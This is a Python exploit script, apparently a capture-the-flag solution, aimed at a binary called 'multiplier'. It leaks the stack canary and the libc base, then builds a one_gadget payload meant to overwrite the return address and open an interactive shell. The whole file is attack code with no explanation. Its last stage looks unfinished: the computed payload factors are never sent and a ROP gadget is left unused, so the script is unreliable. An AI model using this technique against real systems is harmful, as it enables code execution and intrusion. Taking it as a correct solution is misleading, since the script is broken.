from ptrlib import *
import random

libc = ELF("./libc-2.27.so")
sock = Process("./multiplier")

sock.recvline()

# leak canary
sock.recvline()
for i in range(25):
    sock.sendline("255")
sock.sendline("0")
canary = bytes.fromhex(bytes2str(sock.recvline().rstrip()[:-0x18 * 2]))
canary = u64(b'\x00' + canary[::-1][1:])
dump("canary = " + hex(canary))

# leak libc base
sock.recvline()
for i in range(41):
    sock.sendline("255")
sock.sendline("0")
addr_retaddr = bytes.fromhex(bytes2str(sock.recvline().rstrip()[:-0x28 * 2]))
addr_retaddr = u64(addr_retaddr[::-1])
libc_base = (addr_retaddr - libc.symbol("__libc_start_main")) & 0xfffffffffffff000
addr_one_gadget = libc_base + 0x4f322
dump("libc base = " + hex(libc_base))

def find_product(minimum, maximum):
    for i in range(0x1000):
        prod = 1
        l = []
        while True:
            x = 2 * random.randint(1, 127) + 1
            if x != 1:
                prod *= x
                l.append(x)
            if minimum <= prod <= maximum:
                return l
            if prod > maximum:
                break
            if x == 1:
                break
    return None

# find product
rop_pop_rdi = 0x0002155f
payload = 0
payload = (payload | addr_one_gadget) << 64
payload = (payload | 0) << 64
payload = (payload | canary) << (64 + 0x10 * 8)
#payload = (payload | 0) << (64 + 0x10 * 8)
minimum = payload
maximum = payload | (2 ** (0x28 * 8) - 1)

l = find_product(minimum, maximum)
if l is None:
    dump("Bad luck", "warning")
    exit()

# overwrite return address
sock.recvline()
for i in range(25):
    sock.sendline("255")
sock.sendline("0")

sock.sendline("2")
sock.interactive()
